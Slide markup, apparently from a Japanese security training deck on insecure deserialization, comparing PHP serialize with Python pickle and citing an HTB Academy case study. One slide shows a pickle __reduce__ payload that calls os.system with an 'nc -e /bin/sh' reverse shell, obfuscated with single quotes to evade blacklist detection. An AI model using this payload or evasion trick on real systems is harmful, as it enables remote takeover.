      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8147050" y="1583630"/>
            <a:ext cx="3139440" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>② RCE＋ブラックリスト回避</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8147050" y="1824930"/>
            <a:ext cx="3048000" cy="742950"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6838"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="61321" tIns="61321" rIns="0" bIns="35921" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1163"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>class RCE:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1163"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t> def __reduce__(self):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1163"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>  return os.system,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1163"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>  ("n''c -e /bin/s''h ...",)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8147050" y="2631380"/>
            <a:ext cx="3139440" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>まずping(OAST)で到達確認→シングルクォート挿入でnc/sh検知を回避</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="6238280"/>
            <a:ext cx="427374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179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>補足：演習Cに関連するHTB Academy公式ケーススタディ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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7F6F2"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHP と Python の比較</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1428750"/>
            <a:ext cx="10566400" cy="1854398"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4109"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1428750"/>
            <a:ext cx="10566400" cy="1854398"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10566400" h="1854398">
                <a:moveTo>
                  <a:pt x="10490200" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="10490200" y="0"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="16200000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10566400" y="1778198"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="0" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="76200" y="1854398"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="5400000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="0" y="1778198"/>
                </a:lnTo>
                <a:arcTo hR="69850" wR="76200" stAng="10800000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="10490200" y="1848048"/>
                </a:lnTo>
                <a:arcTo hR="69850" wR="69850" stAng="5400000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="10560050" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="69850" stAng="0" swAng="-5400000"/>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="E2E0D9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1428750"/>
            <a:ext cx="10566400" cy="1854398"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10566400" h="1854398">
                <a:moveTo>
                  <a:pt x="76200" y="1854398"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="76200" y="1854398"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="5400000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="0" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="10800000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10490200" y="0"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="16200000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10566400" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="63500" wR="76200" stAng="0" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="76200" y="12700"/>
                </a:lnTo>
                <a:arcTo hR="63500" wR="63500" stAng="16200000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="12700" y="1778198"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="63500" stAng="10800000" swAng="-5400000"/>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="141413">
              <a:alpha val="22000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>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825500" y="1441450"/>
          <a:ext cx="10547350" cy="1835348"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2320417"/>
                <a:gridCol w="4113466"/>
                <a:gridCol w="4113466"/>
              </a:tblGrid>
              <a:tr h="305891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="ECEAE4"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>観点</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="14171A"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="ECEAE4"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>PHP（serialize/unserialize）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="14171A"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="ECEAE4"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Python（pickle）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="14171A"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>データ表現</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>テキストベース・人間が目視解読可能</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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41618"/>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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>バイナリのオペコード列・解読は困難</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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41618"/>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5891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>識別方法</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>a:N:{...} / O:N:"..." 等の構造パターン</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>プロトコルのマジックバイト（80 04 95 等）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>RCEの典型経路</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>マジックメソッド（__wakeup/__destruct等）を探索・連鎖</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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540"/>
                        </a:lnSpc>
